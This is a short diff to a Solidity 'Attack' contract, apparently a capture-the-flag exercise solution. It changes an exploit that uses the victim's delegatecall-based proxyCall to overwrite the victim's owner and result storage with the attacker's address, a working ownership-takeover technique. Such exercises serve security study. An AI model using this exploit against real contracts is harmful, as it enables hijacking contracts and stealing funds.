@@ -24,9 +24,9 @@ contract Attack {
         victim = addr;
     }
 
-    function changeResult() external {
-        owner = address(122333);
-        result[msg.sender] = true;
+    function changeResult(address owner2) external {
+        owner = owner2;
+        result[owner2] = true;
     }
 
     function exploit() external {
@@ -34,7 +34,8 @@ contract Attack {
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
         // var3 = address(this);
-        bytes memory data = abi.encodeWithSignature("changeResult()");
+        bytes memory data = abi.encodeWithSignature("changeResult(address)", address(this));
+
         ID31eg4t3(victim).proxyCall(data);
         // (abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
         
